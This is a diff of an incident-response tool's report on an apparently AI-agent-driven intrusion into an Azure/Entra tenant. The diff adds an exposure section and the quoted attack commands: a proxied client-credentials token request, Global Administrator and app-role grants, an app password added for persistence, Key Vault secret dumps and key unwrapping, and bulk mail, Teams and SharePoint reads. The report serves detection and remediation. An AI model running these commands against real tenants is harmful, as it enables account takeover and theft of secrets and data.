@@ -7,6 +7,7 @@ Summary
   indicators  32  6 Domain, 2 Email, 1 EntraLoginEndpoint, 4 GUID, 11 GraphEndpoint, 2 IPv4, 3 KeyVaultEndpoint, 1 OAuthScope, 2 URL
   activities  12
   tactics     6
+  exposed     7   Usernames 3, Email addresses 2, IP addresses 2
 
 Timeline   (step, time, role, file)
   1  20261015_090000  script  20261015_090000_step01_token.sh
@@ -54,29 +55,38 @@ Timeline   (step, time, role, file)
 Findings
   activities
     [x] AppCredentialAddition          1 line   Persistence                       T1098.001
-        in  20261015_091000_step03_escalate.ps1
+        what  Invoke-RestMethod -Method Post -Headers $h -Uri "https://graph.microsoft.com/v1.0/applications/66666666-7777-4888-9999-000000000000/addPassword" -Body '{}' (20261015_091000_step03_escalate.ps1:3)
     [x] AppRoleAssignment              2 lines  Persistence, PrivilegeEscalation  T1098.003
-        in  20261015_091000_step03_escalate.ps1, agent_20261015_093500.jsonl
+        what  Invoke-RestMethod -Method Post -Headers $h -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$sp/appRoleAssignments" -Body $grant (20261015_091000_step03_escalate.ps1:5)
+              POST https://graph.microsoft.com/v1.0/servicePrincipals/9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d/appRoleAssignments (agent_20261015_093500.jsonl)
     [x] GlobalAdministratorAssignment  1 line   Persistence, PrivilegeEscalation  T1098.003
-        in  20261015_091000_step03_escalate.ps1
+        what  Invoke-RestMethod -Method Post -Headers $h -Uri "https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=62e90394-69f5-4237-9190-012177145e10/members/`$ref" -Body $member (20261015_091000_step03_escalate.ps1:4)
     [x] KeyVaultKeyUnwrap              1 line   CredentialAccess                  T1555.006
-        in  20261015_093000_step05_vault.sh
+        what  curl -s -X POST -H "Authorization: Bearer $KV" -d @wrapped.json "https://corpvault.vault.azure.net/keys/kek/0a1b2c3d/unwrapkey?api-version=7.4" (20261015_093000_step05_vault.sh:8)
     [x] KeyVaultSecretRead             3 lines  CredentialAccess                  T1555.006
-        in  20261015_093000_step05_vault.sh, agent_20261015_093500.jsonl
+        what  az keyvault secret list --vault-name "$v" -o tsv >> secrets_20261015_093030.txt (20261015_093000_step05_vault.sh:4)
+              curl -s -H "Authorization: Bearer $KV" "https://corpvault.vault.azure.net/secrets/db-password?api-version=7.4" >> secrets_20261015_093030.txt (20261015_093000_step05_vault.sh:7)
+              az keyvault secret show --vault-name finvault --name api-key (agent_20261015_093500.jsonl)
     [x] TokenRequest                   2 lines  InitialAccess                     T1078.004, AML.T0012
-        in  20261015_090000_step01_token.sh
+        what  curl -s -x http://144.172.64.128:8080 -d "client_id=$APP" -d "scope=https://graph.microsoft.com/.default" -d "grant_type=client_credentials" -d "client_secret=$SECRET" "https://login.microsoftonlin... (20261015_090000_step01_token.sh:5)
+              az login --service-principal -u "$APP" -p "$SECRET" --tenant "$TENANT" (20261015_090000_step01_token.sh:8)
     [!] MailboxAccess                  1 line   Collection                        T1114.002, AML.T0126
-        in  20261015_092000_step04_collect.py
+        what  mail = requests.get("https://graph.microsoft.com/v1.0/users/" + user + "/messages?$top=500", headers=headers) (20261015_092000_step04_collect.py:8)
     [!] SharePointEnumeration          2 lines  Collection                        T1213.002, AML.T0126, AML.T0036
-        in  20261015_092000_step04_collect.py
+        what  sites = requests.get("https://graph.microsoft.com/v1.0/sites?search=*", headers=headers) (20261015_092000_step04_collect.py:10)
+              drive = requests.get("https://graph.microsoft.com/v1.0/sites/root/drives", headers=headers) (20261015_092000_step04_collect.py:11)
     [!] TeamsMessageAccess             1 line   Collection                        T1213.005, AML.T0126, AML.T0036
-        in  20261015_092000_step04_collect.py
+        what  chat = requests.get("https://graph.microsoft.com/v1.0/users/" + user + "/mailFolders/TeamsMessagesData/messages", headers=headers) (20261015_092000_step04_collect.py:9)
     [i] AzureResourceEnumeration       1 line   Discovery                         T1580, AML.T0075
-        in  20261015_093000_step05_vault.sh
+        what  az keyvault list --query "[].name" -o tsv > vaults_20261015_093010.txt (20261015_093000_step05_vault.sh:2)
     [i] GraphDirectoryEnumeration      4 lines  Discovery                         T1087.004, T1069.003, AML.T0075
-        in  20261015_090500_step02_recon.ps1
+        what  Invoke-RestMethod -Headers $h -Uri "https://graph.microsoft.com/v1.0/users?`$top=999" | ConvertTo-Json | Out-File directory_20261015_090530.txt (20261015_090500_step02_recon.ps1:2)
+              Invoke-RestMethod -Headers $h -Uri "https://graph.microsoft.com/v1.0/servicePrincipals?`$top=999" (20261015_090500_step02_recon.ps1:3)
+              Invoke-RestMethod -Headers $h -Uri "https://graph.microsoft.com/v1.0/directoryRoles" (20261015_090500_step02_recon.ps1:4)
+              and 1 more in the saved report
     [i] KeyVaultKeyEnumeration         2 lines  Discovery                         T1580, AML.T0075
-        in  20261015_093000_step05_vault.sh, agent_20261015_093500.jsonl
+        what  az keyvault key list --vault-name "$v" -o tsv (20261015_093000_step05_vault.sh:5)
+              GET https://finvault.vault.azure.net/keys?api-version=7.4 (agent_20261015_093500.jsonl)
   indicators
     [x] Domain              corpvault.vault.azure.net                                     20261015_093000_step05_vault.sh
     [x] Domain              finvault.vault.azure.net                                      agent_20261015_093500.jsonl
@@ -130,82 +140,189 @@ Notable files   (a finding of high severity)
   [x] output  agent_20261015_093500.jsonl
       found   AppRoleAssignment, KeyVaultSecretRead
 
+Exposure   (collected: first seen in an output; used: first seen in a script; a secret is masked)
+  Usernames (3)
+    [!] alice@corp.example                    collected  directory_20261015_090530.txt:1
+    [!] bob@corp.example                      collected  directory_20261015_090530.txt:1
+    [!] 66666666-7777-4888-9999-000000000000  used       20261015_090000_step01_token.sh:8
+  Email addresses (2)
+    [!] alice@corp.example  collected  directory_20261015_090530.txt:1, 20261015_092000_step04_collect.py:7
+    [!] bob@corp.example    collected  directory_20261015_090530.txt:1, 20261015_092000_step04_collect.py:7
+  IP addresses (2)
+    [i] 144.172.64.60   collected  agent_20261015_093500.jsonl
+    [i] 144.172.64.128  used       20261015_090000_step01_token.sh:5, agent_20261015_093500.jsonl
+
 Impact
   [x] Privileged access obtained
       A principal was given a privileged role or permission, or a route to root on a host was opened. Treat what it governs as under attacker control until reviewed.
-      basis  GlobalAdministratorAssignment, AppRoleAssignment
-      files  20261015_091000_step03_escalate.ps1, agent_20261015_093500.jsonl
+      targets  role roleTemplateId=62e90394-69f5-4237-9190-012177145e10; principal 9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d ($sp); principal 9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d
+      what     GlobalAdministratorAssignment: Invoke-RestMethod -Method Post -Headers $h -Uri "https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=62e90394-69f5-4237-9190-012177145e10/members/`$ref" -Body $member (20261015_091000_step03_escalate.ps1:4)
+               AppRoleAssignment: Invoke-RestMethod -Method Post -Headers $h -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$sp/appRoleAssignments" -Body $grant (20261015_091000_step03_escalate.ps1:5)
+               AppRoleAssignment: POST https://graph.microsoft.com/v1.0/servicePrincipals/9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d/appRoleAssignments (agent_20261015_093500.jsonl)
+      basis    GlobalAdministratorAssignment, AppRoleAssignment
   [x] Credentials exposed
       Secrets, keys, certificates or stored passwords were read. Treat them as known to the attacker. Affected: corpvault.vault.azure.net, finvault.vault.azure.net.
-      basis  KeyVaultSecretRead, KeyVaultKeyUnwrap
-      files  20261015_093000_step05_vault.sh, agent_20261015_093500.jsonl
+      targets  vault corpvault; secret db-password; vault finvault; secret api-key; key kek
+      what     KeyVaultSecretRead: az keyvault secret list --vault-name "$v" -o tsv >> secrets_20261015_093030.txt (20261015_093000_step05_vault.sh:4)
+               KeyVaultSecretRead: curl -s -H "Authorization: Bearer $KV" "https://corpvault.vault.azure.net/secrets/db-password?api-version=7.4" >> secrets_20261015_093030.txt (20261015_093000_step05_vault.sh:7)
+               KeyVaultSecretRead: az keyvault secret show --vault-name finvault --name api-key (agent_20261015_093500.jsonl)
+               KeyVaultKeyUnwrap: curl -s -X POST -H "Authorization: Bearer $KV" -d @wrapped.json "https://corpvault.vault.azure.net/keys/kek/0a1b2c3d/unwrapkey?api-version=7.4" (20261015_093000_step05_vault.sh:8)
+      basis    KeyVaultSecretRead, KeyVaultKeyUnwrap
   [x] Persistence established
       A way back in was created: a credential, an account, a key, a scheduled job, a service or a start-up entry. Access survives a password reset.
-      basis  AppCredentialAddition
-      files  20261015_091000_step03_escalate.ps1
+      targets  application 66666666-7777-4888-9999-000000000000
+      what     AppCredentialAddition: Invoke-RestMethod -Method Post -Headers $h -Uri "https://graph.microsoft.com/v1.0/applications/66666666-7777-4888-9999-000000000000/addPassword" -Body '{}' (20261015_091000_step03_escalate.ps1:3)
+      basis    AppCredentialAddition
   [x] Valid identity used
       The attacker signed in as an identity that exists. Sign-in controls did not stop it.
-      basis  TokenRequest
-      files  20261015_090000_step01_token.sh
+      targets  tenant 11111111-2222-4333-8444-555555555555 ($TENANT); client 66666666-7777-4888-9999-000000000000 ($APP)
+      what     TokenRequest: curl -s -x http://144.172.64.128:8080 -d "client_id=$APP" -d "scope=https://graph.microsoft.com/.default" -d "grant_type=client_credentials" -d "client_secret=$SECRET" "https://login.microsoftonlin... (20261015_090000_step01_token.sh:5)
+               TokenRequest: az login --service-principal -u "$APP" -p "$SECRET" --tenant "$TENANT" (20261015_090000_step01_token.sh:8)
+      basis    TokenRequest
   [x] Data collected
       Mail, chat, documents or files were gathered in bulk. Treat their content as disclosed. Affected: alice@corp.example, bob@corp.example.
-      basis  MailboxAccess, TeamsMessageAccess, SharePointEnumeration
-      files  20261015_092000_step04_collect.py
+      targets  resource /sites; resource /sites/root/drives
+      what     MailboxAccess: mail = requests.get("https://graph.microsoft.com/v1.0/users/" + user + "/messages?$top=500", headers=headers) (20261015_092000_step04_collect.py:8)
+               TeamsMessageAccess: chat = requests.get("https://graph.microsoft.com/v1.0/users/" + user + "/mailFolders/TeamsMessagesData/messages", headers=headers) (20261015_092000_step04_collect.py:9)
+               SharePointEnumeration: sites = requests.get("https://graph.microsoft.com/v1.0/sites?search=*", headers=headers) (20261015_092000_step04_collect.py:10)
+               SharePointEnumeration: drive = requests.get("https://graph.microsoft.com/v1.0/sites/root/drives", headers=headers) (20261015_092000_step04_collect.py:11)
+      basis    MailboxAccess, TeamsMessageAccess, SharePointEnumeration
   [!] Commands generated by an AI agent
       The scripts were written by an AI agent, which is the premise of this tool. Generated commands differ from run to run, so a detection that matches exact text misses them.
-      basis  the premise of the tool
-      files  20261015_090000_step01_token.sh, 20261015_090500_step02_recon.ps1, 20261015_091000_step03_escalate.ps1 and 3 more
+      basis    the premise of the tool
+      files    20261015_090000_step01_token.sh, 20261015_090500_step02_recon.ps1, 20261015_091000_step03_escalate.ps1 and 3 more
   [i] Environment mapped
       Identities, resources or configuration were listed. Later steps were probably aimed with the result.
-      basis  GraphDirectoryEnumeration, AzureResourceEnumeration, KeyVaultKeyEnumeration, Discovery tools
-      files  20261015_090000_step01_token.sh, 20261015_090500_step02_recon.ps1, 20261015_093000_step05_vault.sh and 1 more
+      targets  resource /users; resource /servicePrincipals; resource /directoryRoles; command Get-MgApplication; command az keyvault list; vault finvault; username alice@corp.example; username bob@corp.example; email alice@corp.example; email bob@corp.example; ip 144.172.64.60
+      what     GraphDirectoryEnumeration: Invoke-RestMethod -Headers $h -Uri "https://graph.microsoft.com/v1.0/users?`$top=999" | ConvertTo-Json | Out-File directory_20261015_090530.txt (20261015_090500_step02_recon.ps1:2)
+               GraphDirectoryEnumeration: Invoke-RestMethod -Headers $h -Uri "https://graph.microsoft.com/v1.0/servicePrincipals?`$top=999" (20261015_090500_step02_recon.ps1:3)
+               GraphDirectoryEnumeration: Invoke-RestMethod -Headers $h -Uri "https://graph.microsoft.com/v1.0/directoryRoles" (20261015_090500_step02_recon.ps1:4)
+               GraphDirectoryEnumeration: Get-MgApplication -All (20261015_090500_step02_recon.ps1:5)
+               AzureResourceEnumeration: az keyvault list --query "[].name" -o tsv > vaults_20261015_093010.txt (20261015_093000_step05_vault.sh:2)
+               KeyVaultKeyEnumeration: az keyvault key list --vault-name "$v" -o tsv (20261015_093000_step05_vault.sh:5)
+               and 3 more in the saved report
+      basis    GraphDirectoryEnumeration, AzureResourceEnumeration, KeyVaultKeyEnumeration, Discovery tools, exposed username, exposed email, exposed ip
 
 Remediation   (most urgent first)
   [x] Revoke sessions and reset identities
       Revoke the sessions and tokens of every identity in the evidence and reset its credentials.
-      basis  TokenRequest
-      files  20261015_090000_step01_token.sh
+      targets  tenant 11111111-2222-4333-8444-555555555555 ($TENANT); client 66666666-7777-4888-9999-000000000000 ($APP)
+      what     TokenRequest: curl -s -x http://144.172.64.128:8080 -d "client_id=$APP" -d "scope=https://graph.microsoft.com/.default" -d "grant_type=client_credentials" -d "client_secret=$SECRET" "https://login.microsoftonlin... (20261015_090000_step01_token.sh:5)
+               TokenRequest: az login --service-principal -u "$APP" -p "$SECRET" --tenant "$TENANT" (20261015_090000_step01_token.sh:8)
+      basis    TokenRequest
   [x] Remove added credentials
       Remove every password and key added to an application or service principal, then review all credentials added since the first step.
-      basis  AppCredentialAddition
-      files  20261015_091000_step03_escalate.ps1
+      targets  application 66666666-7777-4888-9999-000000000000
+      what     AppCredentialAddition: Invoke-RestMethod -Method Post -Headers $h -Uri "https://graph.microsoft.com/v1.0/applications/66666666-7777-4888-9999-000000000000/addPassword" -Body '{}' (20261015_091000_step03_escalate.ps1:3)
+      basis    AppCredentialAddition
   [x] Remove role and permission grants
       Remove the role assignments and application permissions that were granted, then review every privileged member and consent.
-      basis  GlobalAdministratorAssignment, AppRoleAssignment
-      files  20261015_091000_step03_escalate.ps1, agent_20261015_093500.jsonl
+      targets  role roleTemplateId=62e90394-69f5-4237-9190-012177145e10; principal 9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d ($sp); principal 9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d
+      what     GlobalAdministratorAssignment: Invoke-RestMethod -Method Post -Headers $h -Uri "https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=62e90394-69f5-4237-9190-012177145e10/members/`$ref" -Body $member (20261015_091000_step03_escalate.ps1:4)
+               AppRoleAssignment: Invoke-RestMethod -Method Post -Headers $h -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$sp/appRoleAssignments" -Body $grant (20261015_091000_step03_escalate.ps1:5)
+               AppRoleAssignment: POST https://graph.microsoft.com/v1.0/servicePrincipals/9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d/appRoleAssignments (agent_20261015_093500.jsonl)
+      basis    GlobalAdministratorAssignment, AppRoleAssignment
   [x] Rotate what was read
       Rotate every secret, key and certificate that was read, and reset the accounts of any host whose credentials were dumped.
-      basis  KeyVaultSecretRead, KeyVaultKeyUnwrap
-      files  20261015_093000_step05_vault.sh, agent_20261015_093500.jsonl
+      targets  vault corpvault; secret db-password; vault finvault; secret api-key; key kek
+      what     KeyVaultSecretRead: az keyvault secret list --vault-name "$v" -o tsv >> secrets_20261015_093030.txt (20261015_093000_step05_vault.sh:4)
+               KeyVaultSecretRead: curl -s -H "Authorization: Bearer $KV" "https://corpvault.vault.azure.net/secrets/db-password?api-version=7.4" >> secrets_20261015_093030.txt (20261015_093000_step05_vault.sh:7)
+               KeyVaultSecretRead: az keyvault secret show --vault-name finvault --name api-key (agent_20261015_093500.jsonl)
+               KeyVaultKeyUnwrap: curl -s -X POST -H "Authorization: Bearer $KV" -d @wrapped.json "https://corpvault.vault.azure.net/keys/kek/0a1b2c3d/unwrapkey?api-version=7.4" (20261015_093000_step05_vault.sh:8)
+      basis    KeyVaultSecretRead, KeyVaultKeyUnwrap
   [x] Scope the data taken
       Establish from audit logs which mailboxes, chats, sites and files were read or sent out, and assess that data as breached.
-      basis  MailboxAccess, TeamsMessageAccess, SharePointEnumeration
-      files  20261015_092000_step04_collect.py
+      targets  resource /sites; resource /sites/root/drives
+      what     MailboxAccess: mail = requests.get("https://graph.microsoft.com/v1.0/users/" + user + "/messages?$top=500", headers=headers) (20261015_092000_step04_collect.py:8)
+               TeamsMessageAccess: chat = requests.get("https://graph.microsoft.com/v1.0/users/" + user + "/mailFolders/TeamsMessagesData/messages", headers=headers) (20261015_092000_step04_collect.py:9)
+               SharePointEnumeration: sites = requests.get("https://graph.microsoft.com/v1.0/sites?search=*", headers=headers) (20261015_092000_step04_collect.py:10)
+               SharePointEnumeration: drive = requests.get("https://graph.microsoft.com/v1.0/sites/root/drives", headers=headers) (20261015_092000_step04_collect.py:11)
+      basis    MailboxAccess, TeamsMessageAccess, SharePointEnumeration
   [i] Follow what was enumerated
       Use what was listed to predict targets: check those identities, vaults and hosts for later activity.
-      basis  GraphDirectoryEnumeration, AzureResourceEnumeration, KeyVaultKeyEnumeration, Discovery tools
-      files  20261015_090000_step01_token.sh, 20261015_090500_step02_recon.ps1, 20261015_093000_step05_vault.sh and 1 more
+      targets  resource /users; resource /servicePrincipals; resource /directoryRoles; command Get-MgApplication; command az keyvault list; vault finvault; username alice@corp.example; username bob@corp.example; email alice@corp.example; email bob@corp.example; ip 144.172.64.60
+      what     GraphDirectoryEnumeration: Invoke-RestMethod -Headers $h -Uri "https://graph.microsoft.com/v1.0/users?`$top=999" | ConvertTo-Json | Out-File directory_20261015_090530.txt (20261015_090500_step02_recon.ps1:2)
+               GraphDirectoryEnumeration: Invoke-RestMethod -Headers $h -Uri "https://graph.microsoft.com/v1.0/servicePrincipals?`$top=999" (20261015_090500_step02_recon.ps1:3)
+               GraphDirectoryEnumeration: Invoke-RestMethod -Headers $h -Uri "https://graph.microsoft.com/v1.0/directoryRoles" (20261015_090500_step02_recon.ps1:4)
+               GraphDirectoryEnumeration: Get-MgApplication -All (20261015_090500_step02_recon.ps1:5)
+               AzureResourceEnumeration: az keyvault list --query "[].name" -o tsv > vaults_20261015_093010.txt (20261015_093000_step05_vault.sh:2)
+               KeyVaultKeyEnumeration: az keyvault key list --vault-name "$v" -o tsv (20261015_093000_step05_vault.sh:5)
+               and 3 more in the saved report
+      basis    GraphDirectoryEnumeration, AzureResourceEnumeration, KeyVaultKeyEnumeration, Discovery tools, exposed username, exposed email, exposed ip
 
 Mitigation   (MITRE ATT&CK and ATLAS, for the techniques found)
   [x] M1015 Active Directory Configuration                          T1078.004
+      Implement robust Active Directory (AD) configurations using group policies to secure user accounts, control access, and minimize the attack surface.
+      for  TokenRequest: tenant 11111111-2222-4333-8444-555555555555 ($TENANT), client 66666666-7777-4888-9999-000000000000 ($APP)
   [x] M1017 User Training                                           T1078.004, T1213.002, T1213.005
+      User Training involves educating employees and contractors on recognizing, reporting, and preventing cyber threats that rely on human interaction, such as phishing, social engineering, and other manipulative techniques.
+      for  TokenRequest: tenant 11111111-2222-4333-8444-555555555555 ($TENANT), client 66666666-7777-4888-9999-000000000000 ($APP)
+           SharePointEnumeration: resource /sites, resource /sites/root/drives
   [x] M1018 User Account Management                                 T1078.004, T1087.004, T1098.001, T1098.003, T1213.002, T1580
+      User Account Management involves implementing and enforcing policies for the lifecycle of user accounts, including creation, modification, and deactivation.
+      for  TokenRequest: tenant 11111111-2222-4333-8444-555555555555 ($TENANT), client 66666666-7777-4888-9999-000000000000 ($APP)
+           GraphDirectoryEnumeration: resource /users, resource /servicePrincipals, resource /directoryRoles, command Get-MgApplication
+           AppCredentialAddition: application 66666666-7777-4888-9999-000000000000
+           GlobalAdministratorAssignment: role roleTemplateId=62e90394-69f5-4237-9190-012177145e10
+           AppRoleAssignment: principal 9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d ($sp), principal 9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d
+           SharePointEnumeration: resource /sites, resource /sites/root/drives
+           and 2 more in the saved report
   [x] M1026 Privileged Account Management                           T1078.004, T1098.001, T1098.003, T1555.006
+      Privileged Account Management focuses on implementing policies, controls, and tools to securely manage privileged accounts (e.g., SYSTEM, root, or administrative accounts).
+      for  TokenRequest: tenant 11111111-2222-4333-8444-555555555555 ($TENANT), client 66666666-7777-4888-9999-000000000000 ($APP)
+           AppCredentialAddition: application 66666666-7777-4888-9999-000000000000
+           GlobalAdministratorAssignment: role roleTemplateId=62e90394-69f5-4237-9190-012177145e10
+           AppRoleAssignment: principal 9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d ($sp), principal 9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d
+           KeyVaultSecretRead: vault corpvault, secret db-password, vault finvault, secret api-key
+           KeyVaultKeyUnwrap: vault corpvault, key kek
   [x] M1027 Password Policies                                       T1078.004
+      Set and enforce secure password policies for accounts to reduce the likelihood of unauthorized access.
+      for  TokenRequest: tenant 11111111-2222-4333-8444-555555555555 ($TENANT), client 66666666-7777-4888-9999-000000000000 ($APP)
   [x] M1030 Network Segmentation                                    T1098.001
+      Network segmentation involves dividing a network into smaller, isolated segments to control and limit the flow of traffic between devices, systems, and applications.
+      for  AppCredentialAddition: application 66666666-7777-4888-9999-000000000000
   [x] M1032 Multi-factor Authentication                             T1078.004, T1098.001, T1098.003, T1114.002
+      Multi-Factor Authentication (MFA) enhances security by requiring users to provide at least two forms of verification to prove their identity before granting access.
+      for  TokenRequest: tenant 11111111-2222-4333-8444-555555555555 ($TENANT), client 66666666-7777-4888-9999-000000000000 ($APP)
+           AppCredentialAddition: application 66666666-7777-4888-9999-000000000000
+           GlobalAdministratorAssignment: role roleTemplateId=62e90394-69f5-4237-9190-012177145e10
+           AppRoleAssignment: principal 9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d ($sp), principal 9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d
   [x] M1036 Account Use Policies                                    T1078.004
+      Account Use Policies help mitigate unauthorized access by configuring and enforcing rules that govern how and when accounts can be used.
+      for  TokenRequest: tenant 11111111-2222-4333-8444-555555555555 ($TENANT), client 66666666-7777-4888-9999-000000000000 ($APP)
   [x] M1042 Disable or Remove Feature or Program                    T1098.001
+      Disable or remove unnecessary and potentially vulnerable software, features, or services to reduce the attack surface and prevent abuse by adversaries.
+      for  AppCredentialAddition: application 66666666-7777-4888-9999-000000000000
   [!] M1041 Encrypt Sensitive Information                           T1114.002
+      Protect sensitive information at rest, in transit, and during processing by using strong encryption algorithms.
+      for  MailboxAccess
   [!] M1047 Audit                                                   T1087.004, T1213.002, T1213.005
+      Auditing is the process of recording activity and systematically reviewing and analyzing the activity and system configurations.
+      for  GraphDirectoryEnumeration: resource /users, resource /servicePrincipals, resource /directoryRoles, command Get-MgApplication
+           SharePointEnumeration: resource /sites, resource /sites/root/drives
   [!] M1060 Out-of-Band Communications Channel                      T1114.002, T1213.005
+      Establish secure out-of-band communication channels to ensure the continuity of critical communications during security incidents, data integrity attacks, or in-network communication failures.
+      for  MailboxAccess, TeamsMessageAccess
   [x] AML.M0005 Control Access to AI Models and Data at Rest        AML.T0012, AML.T0126
+      Establish access controls on internal model registries and limit internal access to production models.
+      for  TokenRequest: tenant 11111111-2222-4333-8444-555555555555 ($TENANT), client 66666666-7777-4888-9999-000000000000 ($APP)
+           SharePointEnumeration: resource /sites, resource /sites/root/drives
   [x] AML.M0019 Control Access to AI Models and Data in Production  AML.T0012
+      Require users to verify their identities before accessing a production model.
+      for  TokenRequest: tenant 11111111-2222-4333-8444-555555555555 ($TENANT), client 66666666-7777-4888-9999-000000000000 ($APP)
   [x] AML.M0043 AI Agent External Resource Lifecycle Management     AML.T0012
+      Organizations should control external resources created or acquired by AI agents during execution by treating those resources as attributable, lifecycle-managed assets.
+      for  TokenRequest: tenant 11111111-2222-4333-8444-555555555555 ($TENANT), client 66666666-7777-4888-9999-000000000000 ($APP)
   [!] AML.M0020 Generative AI Guardrails                            AML.T0102
+      Guardrails are safety controls placed between users, tools, and generative AI models to evaluate prompts, retrieved context, model outputs, and agent actions before they are accepted, executed, or shown to a user.
+      for  Commands generated by an AI agent
   [!] AML.M0022 Generative AI Model Alignment                       AML.T0102
+      Generative AI Model Alignment is the process of training or fine-tuning a generative model to guide its output toward a set of human values, goals, or ethical principles.
+      for  Commands generated by an AI agent
   [!] AML.M0039 AI Honeypots                                        AML.T0126
+      Deploy monitored decoy AI services, agents, credentials, or other resources that resemble legitimate, active assets in the external or internal environment, but serve no real business or operational functions.
+      for  SharePointEnumeration: resource /sites, resource /sites/root/drives
 
 [x] HIGH - 7 impacts: 5 high, 1 medium, 1 low
--> saved to <out>: report.txt, files.json, trace.json, findings.json, report.json
+-> saved to <out>: report.txt, files.json, trace.json, findings.json, exposure.json, report.json
 -> one section: slopmop -inputdir <folder> report impact
